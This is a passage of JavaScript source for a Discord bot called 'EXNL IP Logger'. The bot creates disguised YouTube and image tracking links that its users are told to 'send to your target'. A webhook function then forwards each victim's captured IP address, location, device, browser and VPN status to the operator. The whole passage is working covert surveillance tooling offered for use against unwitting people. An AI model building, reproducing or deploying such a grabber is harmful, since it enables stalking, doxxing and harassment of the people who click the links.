            .setDescription('Here\'s your tracking link - copy and send this to your target!')
            .addFields({
                name: '🔗 Tracking URL',
                value: `\`${trackingUrl}\``,
                inline: false
            })
            .setFooter({ text: 'When someone clicks this link, you\'ll get their IP and location data!' })
            .setTimestamp();

        await interaction.user.send({ embeds: [dmEmbed] });

        // Store tracking data locally with webhook if configured
        storeTrackingData(interaction.user.id, {
            type: 'youtube',
            originalUrl: youtubeUrl,
            trackingUrl: trackingUrl,
            trackingId: trackingId,
            videoId: videoId,
            webhook: userWebhooks.get(interaction.user.id)
        });

    } catch (error) {
        console.error('YouTube command error:', error);
    }
}

async function handleImageCommand(interaction) {
    const imageAttachment = interaction.options.getAttachment('image');

    if (!imageAttachment || !imageAttachment.contentType?.startsWith('image/')) {
        const errorEmbed = new EmbedBuilder()
            .setColor('#FF0000')
            .setTitle('❌ Invalid Image')
            .setDescription('Please provide a valid image file.')
            .setTimestamp();

        return interaction.reply({ embeds: [errorEmbed], ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    try {
        // Generate tracking link (same format as website)
        const trackingId = generateTrackingId();
        const trackingUrl = `${API_BASE_URL}/raw/image.jpg?tid=${trackingId}`;

        // Note: Bot uses default pixel image. Users must upload custom images via website.

        const embed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('📸 Image Tracking Link Generated')
            .setDescription('Your image tracking link has been created!')
            .addFields(
                {
                    name: '🎯 Tracking Link',
                    value: `\`${trackingUrl}\``,
                    inline: false
                },
                {
                    name: '📋 Instructions',
                    value: 'This link shows a default pixel image and logs IP data. To use custom images, upload them via the website.',
                    inline: false
                },
                {
                    name: '💡 Note',
                    value: 'The uploaded image is for reference only. The tracking link uses the default website image.',
                    inline: false
                }
            )
//.setImage(imageAttachment.url) // Removed - tracking uses default image
            .setFooter({ text: '🕵️ EXNL IP Logger | Image Tracker' })
            .setTimestamp();

        const row = new ActionRowBuilder()
            .addComponents(
                new ButtonBuilder()
                    .setCustomId(`copy_image_${trackingId}`)
                    .setLabel('📋 Copy Tracking Link')
                    .setStyle(ButtonStyle.Success)
            );

        await interaction.editReply({ embeds: [embed], components: [row] });

        // Send to user's DM
        const dmEmbed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('🎯 Your Image Tracking Link | EXNL')
            .setDescription('Here\'s your tracking link - copy and send this to your target!')
            .addFields({
                name: '🔗 Tracking URL',
                value: `\`${trackingUrl}\``,
                inline: false
            })
            .setFooter({ text: 'When someone views this image, you\'ll get their IP and location data!' })
            .setTimestamp();

        await interaction.user.send({ embeds: [dmEmbed] });

    } catch (error) {
        console.error('Image command error:', error);
        await interaction.editReply({
            content: '❌ Failed to process image. Please try again.',
            ephemeral: true
        });
    }
}

// Handle button interactions
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const [action, type, trackingId] = interaction.customId.split('_');

    if (action === 'copy') {
        const trackingData = getTrackingData(interaction.user.id, trackingId);
        
        if (trackingData) {
            const copyEmbed = new EmbedBuilder()
                .setColor('#00FF00')
                .setTitle('📋 Link Copied!')
                .setDescription(`Your ${type} tracking link has been copied to your DMs.`)
                .addFields({
                    name: '🎯 Tracking URL',
                    value: `\`${trackingData.trackingUrl}\``,
                    inline: false
                })
                .setTimestamp();

            await interaction.reply({ embeds: [copyEmbed], ephemeral: true });
        }
    }
});

// Utility functions
function extractYouTubeVideoId(url) {
    const regExp = /^.*((youtu.be\/)|(v\/)|(\/u\/\w\/)|(embed\/)|(watch\?))\??v?=?([^#&?]*).*/;
    const match = url.match(regExp);
    return (match && match[7].length === 11) ? match[7] : null;
}

function generateTrackingId() {
    return Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
}

const trackingStorage = new Map();

function storeTrackingData(userId, data) {
    if (!trackingStorage.has(userId)) {
        trackingStorage.set(userId, []);
    }
    trackingStorage.get(userId).push(data);
}

function getTrackingData(userId, trackingId) {
    const userTrackingData = trackingStorage.get(userId) || [];
    return userTrackingData.find(data => data.trackingId === trackingId);
}

async function storeImageForTracking(trackingId, imageData) {
    // Local storage only - images handled by website
    try {
        // Just store locally for reference, no API call needed
        return true;
        /*const response = await fetch(`${API_BASE_URL}/api/store-tracking-image`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                trackingId,
                ...imageData
            })
        });
        
        if (!response.ok) {
            throw new Error('Failed to store image');
        }
        
        return await response.json();*/
    } catch (error) {
        console.error('Failed to store tracking image:', error);
        throw error;
    }
}

// IP log webhook sender
async function sendIpLogToWebhook(webhookUrl, logData) {
    if (!webhookUrl) return;

    const embed = {
        title: '🎯 New IP Log Captured | EXNL',
        color: 0xFF0000,
        fields: [
            {
                name: '🌐 IP Address',
                value: `\`${logData.ipAddress}\``,
                inline: true
            },
            {
                name: '📍 Location',
                value: logData.location || 'Unknown',
                inline: true
            },
            {
                name: '💻 Device',
                value: `${logData.deviceType || 'Unknown'} - ${logData.operatingSystem || 'Unknown'}`,
                inline: false
            },
            {
                name: '🌐 Browser',
                value: `${logData.browserName || 'Unknown'} ${logData.browserVersion || ''}`,
                inline: true
            },
            {
                name: '🛡️ VPN Status',
                value: logData.isVpn === 'yes' ? '🚨 VPN Detected' : '✅ Direct Connection',
                inline: true
            },
            {
                name: '🔗 Referrer',
                value: logData.referrer || 'Direct Access',
                inline: false
            },
            {
                name: '🕐 Timestamp',
                value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
                inline: false
            }
        ],
        footer: {
            text: '🕵️ EXNL IP Logger Bot',
            icon_url: 'https://cdn.discordapp.com/emojis/853928735535742986.png'
        },
        timestamp: new Date().toISOString()
    };

    try {
        await fetch(webhookUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ embeds: [embed] })
        });
    } catch (error) {
        console.error('Failed to send webhook:', error);
    }
}

// Login to Discord
client.login(DISCORD_BOT_TOKEN).catch(error => {
    console.error('❌ Failed to login to Discord:', error.message);
    if (error.message.includes('TOKEN_INVALID')) {
        console.error('Invalid bot token! Please check your token in Replit Secrets.');
    }
    process.exit(1);
});

module.exports = { client, sendIpLogToWebhook };
